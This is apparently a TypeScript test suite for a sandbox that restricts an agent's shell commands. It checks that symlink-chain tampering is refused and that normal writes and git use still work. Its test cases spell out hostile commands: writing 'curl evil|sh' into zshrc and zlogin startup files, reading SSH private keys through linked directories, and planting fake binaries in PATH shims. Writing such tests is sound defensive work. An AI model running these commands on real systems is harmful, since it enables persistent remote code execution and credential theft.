            [`rm '${home}/.dotfiles/zshrc' && printf 'curl evil|sh' > '${home}/.dotfiles/zshrc'`, "replace the middle hop of an rc chain"],
            [`mv '${home}/.dotfiles' '${home}/.dotfiles-old' && mkdir '${home}/.dotfiles' && printf evil > '${home}/.dotfiles/zshrc'`, "move the directory holding a hop"],
            [`rm '${home}/.stow/inner/ssh' && mkdir '${home}/.stow/inner/ssh' && printf x > '${home}/.stow/inner/ssh/config'`, "replace the third hop of a credential chain"],
            [`rm '${home}/.dotfiles/ssh' && ln -s '${home}/.cache' '${home}/.dotfiles/ssh'`, "retarget the second hop of a credential chain"],
            [`cat '${home}/.stow/inner/ssh/id_ed25519'`, "read a credential through a hop"],
            [`rm '${home}/.cache/hop' && mkdir '${home}/.cache/hop' && printf forged > '${home}/.cache/hop/sa_1.json'`, "replace a hop to harness state"],
        ];
        for (const [script, label] of cases) {
            const result = run(paths, script, broad, [registry]);
            assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
            assert.doesNotMatch(result.stdout ?? "", /synthetic-secret/, label);
        }
        for (const link of [".zshrc", ".dotfiles/zshrc", ".ssh", ".dotfiles/ssh", ".stow/inner/ssh", ".cache/hop", ".cache/registry"]) {
            assert.equal(lstatSync(join(home, link)).isSymbolicLink(), true, link);
        }
        assert.equal(readFileSync(join(home, ".zshrc"), "utf8"), "# rc");
        assert.equal(readFileSync(join(home, "state", "registry", "sa_1.json"), "utf8"), "{}");
    }));

    it("keeps a stow link's and a mise link's directories writable but the links fixed", () => fixture((paths) => {
        const { home } = paths;
        const config = join(home, ".config");
        mkdirSync(join(home, "dotfiles", ".config", "git"), { recursive: true });
        writeFileSync(join(home, "dotfiles", ".config", "git", "config"), "[user]\n");
        mkdirSync(join(config, "nvim"), { recursive: true });
        writeFileSync(join(config, "settings.json"), "{}");
        mkdirSync(join(home, ".ssh"));
        writeFileSync(join(home, ".ssh", "id_ed25519"), "synthetic-secret");
        mkdirSync(join(home, ".local", "share", "mise", "shims"), { recursive: true });
        mkdirSync(join(home, ".local", "state"));
        symlinkSync("../dotfiles/.config/git", join(config, "git"));
        symlinkSync(join(home, ".ssh"), join(config, "evil"));
        symlinkSync(join(home, ".local", "share", "mise", "shims"), join(home, ".local", "bin"));
        const allowed = run(paths, [
            `printf 'set nu' > '${config}/nvim/init.lua' && mkdir -p '${config}/nvim/lua' && rm '${config}/nvim/init.lua'`,
            `printf '{"a":1}' > '${config}/settings.json'`,
            `mkdir -p '${home}/.local/state/tool' && printf x > '${home}/.local/state/tool/log'`,
            `printf x > '${home}/.local/share/data'`,
        ].join(" && "));
        assert.equal(allowed.status, 0, output(allowed));
        assert.equal(readFileSync(join(config, "settings.json"), "utf8"), '{"a":1}');
        const cases: [string, string][] = [
            [`rm '${config}/git' && mkdir '${config}/git' && printf evil > '${config}/git/config'`, "replace the stow link"],
            [`mv '${config}/git' '${config}/git-old'`, "move the stow link"],
            [`rm '${home}/.local/bin' && mkdir '${home}/.local/bin' && printf evil > '${home}/.local/bin/git'`, "replace the mise link"],
            [`printf evil > '${home}/.local/share/mise/shims/git'`, "plant a shim"],
            [`cat '${config}/evil/id_ed25519'`, "read a credential through a sibling link"],
            [`printf x > '${config}/evil/config'`, "write a credential dir through a sibling link"],
            // Linux: each rebound entry is a mount point. macOS allows renames inside dot dirs.
            ...(linuxKernel ? [[`mv '${config}/nvim' '${config}/nvim-old'`, "rename a rebound entry"] as [string, string]] : []),
        ];
        for (const [script, label] of cases) {
            const result = run(paths, script);
            assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
            assert.doesNotMatch(result.stdout ?? "", /synthetic-secret/, label);
        }
        const created = run(paths, `mkdir '${config}/new-tool'`);
        if (linuxKernel) assert.notEqual(created.status, 0, "Linux: no new top-level entries beside a protected link");
        else assert.equal(created.status, 0, output(created));
        assert.equal(lstatSync(join(config, "git")).isSymbolicLink(), true);
        assert.equal(lstatSync(join(home, ".local", "bin")).isSymbolicLink(), true);
        assert.equal(readFileSync(join(home, "dotfiles", ".config", "git", "config"), "utf8"), "[user]\n");
    }));

    it("launches with a looping hop inside a dot dir and keeps the loop's links fixed", () => fixture((paths) => {
        const { home } = paths;
        const cache = join(home, ".cache");
        mkdirSync(join(cache, "pip"), { recursive: true });
        symlinkSync(join(cache, "l2"), join(cache, "l1"));
        symlinkSync(join(cache, "l1"), join(cache, "l2"));
        symlinkSync(join(cache, "l1"), join(home, ".zlogin"));
        const allowed = run(paths, `printf x > '${cache}/pip/wheel' && rm '${cache}/pip/wheel'`);
        assert.equal(allowed.status, 0, output(allowed));
        for (const script of [
            `rm '${cache}/l1' && printf 'curl evil|sh' > '${cache}/l1'`,
            `rm '${cache}/l2' && printf 'curl evil|sh' > '${cache}/l2'`,
        ]) {
            assert.notEqual(run(paths, script).status, 0, script);
        }
        assert.equal(lstatSync(join(cache, "l1")).isSymbolicLink(), true);
        assert.equal(lstatSync(join(cache, "l2")).isSymbolicLink(), true);
    }));

    it("refuses to create the missing target of a dangling link, with or without its parent", () => fixture((paths) => {
        const { home } = paths;
        const cases: [string, string][] = [
            [`printf 'curl evil|sh' > '${home}/.dotfiles/zshrc'`, "create the missing target"],
            [`printf 'curl evil|sh' > '${home}/.zshrc'`, "create the target through the link"],
            [`mkdir -p '${home}/.dotfiles' && printf 'curl evil|sh' > '${home}/.dotfiles/zshrc'`, "create the missing parent and target"],
            [`mv '${home}/.dotfiles' '${home}/.dotfiles-old'; mkdir '${home}/.dotfiles' && printf 'curl evil|sh' > '${home}/.dotfiles/zshrc'`, "swap the parent for a new one"],
        ];
        // Parent exists (with another entry that stays writable), then parent missing too.
        mkdirSync(join(home, ".dotfiles"));
        writeFileSync(join(home, ".dotfiles", "aliases"), "# a");
        symlinkSync(join(home, ".dotfiles", "zshrc"), join(home, ".zshrc"));
        const allowed = run(paths, `printf '# b' > '${home}/.dotfiles/aliases'`);
        assert.equal(allowed.status, 0, output(allowed));
        for (const missingParent of [false, true]) {
            if (missingParent) rmSync(join(home, ".dotfiles"), { recursive: true });
            for (const [script, label] of cases) {
                const result = run(paths, script);
                assert.notEqual(result.status, 0, `${label} (parent ${missingParent ? "missing" : "exists"}) must be refused: ${output(result)}`);
                assert.equal(existsSync(join(home, ".dotfiles", "zshrc")), false, label);
            }
            assert.equal(existsSync(join(home, ".dotfiles")), !missingParent);
        }
        assert.equal(lstatSync(join(home, ".zshrc")).isSymbolicLink(), true);
    }));

    it("refuses to create the missing target of a relative dangling hop inside a dot dir, and still launches", () => fixture((paths) => {
        const { home } = paths;
        mkdirSync(join(home, ".cache"));
        mkdirSync(join(home, ".npm", "_cacache"), { recursive: true });
        // ~/.zlogin -> ~/.cache/hop -> ../.npm/rc/zlogin (missing, and so is rc)
        symlinkSync("../.npm/rc/zlogin", join(home, ".cache", "hop"));
        symlinkSync(join(home, ".cache", "hop"), join(home, ".zlogin"));
        const allowed = run(paths, `printf x > '${home}/.npm/_cacache/i'`);
        assert.equal(allowed.status, 0, output(allowed));
        for (const [script, label] of [
            [`mkdir -p '${home}/.npm/rc' && printf 'curl evil|sh' > '${home}/.npm/rc/zlogin'`, "create the missing target"],
            [`printf 'curl evil|sh' > '${home}/.zlogin'`, "create the target through the chain"],
            [`rm '${home}/.cache/hop' && printf 'curl evil|sh' > '${home}/.cache/hop'`, "replace the dangling hop"],
        ] as const) {
            const result = run(paths, script);
            assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
        }
        assert.equal(existsSync(join(home, ".npm", "rc")), false);
        assert.equal(lstatSync(join(home, ".cache", "hop")).isSymbolicLink(), true);
    }));

    it("lets git init, clone and worktree add work in the workspace and a worktree folder", () => fixture((paths) => {
        const git = (cwd: string, args: string[]) => spawnSync("git", args, { cwd, encoding: "utf8", env: { PATH: "/usr/bin:/bin", HOME: paths.home } });
        const source = join(paths.base, "source");
        mkdirSync(source);
        for (const args of [["init", "-q"], ["-c", "user.name=a", "-c", "user.email=a@b", "commit", "-q", "--allow-empty", "-m", "m"]]) {
            assert.equal(git(source, args).status, 0);
        }
        mkdirSync(join(paths.home, ".cache"));
        const worktrees = join(paths.home, "projects", "task-worktrees");
        mkdirSync(worktrees);
        const commit = "git -c user.name=a -c user.email=a@b -c commit.gpgsign=false commit -qm m";
        const result = run(paths, [
            `git init -q && printf x > f && git add f && ${commit}`,
            `git clone -q '${source}' cloned && cd cloned && printf y > g && git add g && ${commit} && cd ..`,
            `git worktree add -q '${join(worktrees, "feature")}' && cd '${join(worktrees, "feature")}' && printf z > h && git add h && ${commit}`,
            `cd '${worktrees}' && mkdir fresh && cd fresh && git init -q && printf w > w && git add w && ${commit}`,
        ].join(" && "));
        assert.equal(result.status, 0, output(result));
        assert.equal(existsSync(join(worktrees, "feature", "h")), true);
    }));

    it("restores removal wherever writes are allowed with Write & delete", () => fixture((paths) => {
        // Stored credentials Read / write: the Linux Write & delete mount cannot mask credentials.
        const result = run(paths, `rm -rf '${paths.sibling}'`, { ...broad, outsideProject: "read-write", storedCredentials: "read-write" });
        assert.equal(result.status, 0, output(result));
        assert.equal(existsSync(paths.sibling), false);
    }));
});
